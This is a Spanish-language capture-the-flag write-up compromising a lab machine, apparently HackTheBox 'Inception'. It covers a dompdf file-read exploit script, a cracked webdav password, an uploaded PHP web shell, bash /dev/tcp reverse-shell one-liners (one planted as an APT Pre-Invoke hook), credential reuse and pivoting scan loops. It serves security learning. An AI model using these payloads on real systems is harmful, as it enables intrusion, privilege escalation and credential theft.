10.10.10.67
-----------

Los puertos abiertos son el 80(http) y el 3128(squid proxy).

El proxy se configura de tal manera, retocando el /etc/proxychains.conf con la linea: ```http 10.10.10.67 3128```
Y comentando la *socks4* de antes  para que no entre en conflicto.

Con el squid proxy se pueden hacer ciertas cosas como enumerar puertos:

```console
└─$ wfuzz -c --hc=404,503 -t 200 -z range,1-65535 -p 10.10.10.67:3128:HTTP http://127.0.0.1:FUZZ

000000022:   200        2 L      4 W        60 Ch       "22"                                                 
000000080:   200        1051 L   169 W      2877 Ch     "80"                                                 
000003128:   400        151 L    416 W      3521 Ch     "3128"
```

Al puerto 22 solo se puede acceder por el proxy.

En cuanto al puerto 80:
```console
└─$ whatweb http://10.10.10.67
http://10.10.10.67 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.67], Script, Title[Inception]
```
Inspeccionamos la web y no tiene nada (un formulario para enviar un mail pero que no funciona).
En cuanto a los comentarios en el código fuente:
```
<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
<!-- Todo: test dompdf on php 7.x -->
```
No se que es dompdf, pero tiene varios exploits ```searchsploit dompdf```
Existe la ruta /dompdf con un monton de phps.

El primer exploit habla de que hay un LFI en la ruta:
```http://10.10.10.67/dompdf/dompdf.php?input_file=/etc/passwd``` Pero no se lee, aun asi existe. 
Para leerlo se puede usar el wrapper php ```?input_file=php://filter/convert.base64-encode/resource=/etc/passwd```

La cosa esque se visualiza en pdf el base64 (pero hay que filtrarlo porque salen mas cosas propias del 
formato pdf), me hice un script para leerlo de manera sencilla.
```bash
#!/bin/bash

archivo=$1
curl -s -X GET "http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/convert.base64-encode/resource=$archivo" | grep -oP '\[\(.*?\)\]' | tr -d "\[\(\)\]" | base64 -d
```
- /etc/passwd -> Existen los usuarios root y cobb (pero este no tiene ninguna id_rsa)
- /proc/net/fib_trie -> la ip de la red interna es: 192.168.0.10
- No podemos hacer un log_poisoning con el /var/log/auth.log (no hay permiso de lectura)
- Como estamos ante un squid proxy podemos leer el archivo de configuracion /etc/squid/squid.conf
- Como la web es apache tirar de /etc/apache/sites-enabled/000-default.conf (o apache2 en este caso)

Hay como unas 3000 lineas del squid.conf, la mayoria comentadas, para quitarlas:
```cat ./squid.conf | grep -v "^#" | grep -ve '^$'```
Pero no hay nada interesante. 
En cuanto al archivo de apache nos da una ruta "AuthUserFile" /var/www/html/webdav_test_inception/webdav.passwd

En ella hay una contraseña -> webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0

```console
└─$ jhon password -w=/usr/share/wordlists/rockyou.txt
babygurl69       (webdav_tester)
```
En el apache.conf dice que esa contraseña vale para la ruta /webdav_test_inception

```console
└─$ davtest -url http://10.10.10.67/webdav_test_inception -auth webdav_tester:babygurl69
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_iKJ7xa_v9GaGTs/davtest_iKJ7xa_v9GaGTs.php
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_iKJ7xa_v9GaGTs/davtest_iKJ7xa_v9GaGTs.php
```
Podemos subir/ejecutar archivos php.
Asi que subirmeos el clasico:
```php
<?php  echo shell_exec($_REQUEST['cmd']); ?>
```
```console
└─$ curl -s -X PUT http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php -d @shell.php
<p>Resource /webdav_test_inception/shell.php has been created.</p>
└─$ curl -s -X GET http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php?cmd=whoami
<pre>www-data</pre>
```
SI le pasamos el comando de reverse shell (con los & urlencodeados a %26)
```bash -c 'bash -i >%26 /dev/tcp/10.10.14.5/443 0>%261'```

La manera es hacer una fake shell para operar con un script [tty over http](https://github.com/CUCUxii/ttyhttp.py/blob/main/ttyhttp.py)

```console
└─$ rlwrap ./inception.py
~$: script /dev/null -c bash
Script started, file is /dev/null
www-data@Inception:/var/www/html/webdav_test_inception$ 
~$: tty
~$: cd ../
www-data@Inception:/var/www/html/wordpress_4.8.3$
~$: cat wp-config.php
# Encontramos las creds root:VwPddNh7xMZyDQoByQL4
~$: su cobb
Password: 
~$: VwPddNh7xMZyDQoByQL4
cobb@Inception:/var/www/html/wordpress_4.8.3$ sudo -l
[sudo] password for cobb:
~$: VwPddNh7xMZyDQoByQL4
User cobb may run the following commands on Inception:
    (ALL : ALL) ALL
~$: sudo su
root@Inception:/var/www/html/webdav_test_inception# 
~$: whoami
whoami
root
~$: cat root.txt
You're waiting for a train. A train that will take you far away. Wake up to find root.txt.
```
Como estamos como root pero no hay flag, puede que estemos en un contenedor
```console
~$: hostname -I
192.168.0.10 
```

Si hay que hacer pivoting, hay que detectar maquinas y demas, con esta shell limitada, el subir scripts se 
hace impracticable. Asi que como tenemos la contraseña del Cobb este se usa para ssh.
```console
└─$ sudo proxychains sshpass -p 'VwPddNh7xMZyDQoByQL4' ssh cobb@127.0.0.1
```

MIgramos a root de la misma manera que antes y para el pivoting tenemos que descubrir tanto la otra maquina
como sus puertos

```bash
#!/bin/bash

for host in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 192.168.0.$host > /dev/null 2>&1" && echo "Host: 192.168.0.$host" &
done; wait
```
```console
root@Inception:/tmp# ./host.sh
Host: 192.168.0.10
Host: 192.168.0.1   #  La otra maquina :)
```
El de los puertos quedo asi (el mismo que uso para los escaneos iniciales en todas las maquinas):
```bash
#!/bin/bash

for port in $(seq 1 10000); do
    timeout 1 bash -c "(echo "" > /dev/tcp/192.168.0.1/$port) 2>/dev/null" && echo "Port $port" &
done; wait
```
Nos reporta que los puertos 21 (ftp), 22 (ssh), y 53 (dns) están abiertos.

```console
root@Inception:/tmp# ftp 192.168.0.1 # Usuario anonymous contraseña anonymous
ftp> get crontab
```
```console
root@Inception:~# cat crontab
*/5 *	* * *	root	apt update 2>&1 >/var/log/apt/custom.log
30 23	* * *	root	apt upgrade -y 2>&1 >/dev/null
```
Esto significa que se está actualizando el sistema cada 5 minutos. Si pones un archivo especial en:
*/etc/apt/apt.conf.d/* se ejecutará antes de actualizar el sistema.

La manera que hay de explotar esto es escribiendo un archivo: *command*:

```APT::Update::Pre-Invoke {" whoami ";};``` En este caso:
```APT::Update::Pre-Invoke {"bash -c 'bash -i >& /dev/tcp/192.168.0.10/443 0>&1'";};```

```console
root@Inception:~# tftp 192.168.0.1    # Ftp especial.
tftp> put command /etc/apt/apt.conf.d/command   # Dicho archivo se tiene que subir a esta ruta
```
```console
root@Inception:/home/cobb# sudo nc -nlvp 443
root@Inception:/tmp# whoami # root
root@Inception:/tmp# hostname -I
hostname -I
10.10.10.67 192.168.0.1 dead:beef::250:56ff:feb9:5325
```
Con esto ya estaríamos en la segunda máquina

Disclaimer: aprendi a resolver la maquina gracias al maestro @s4vitar.
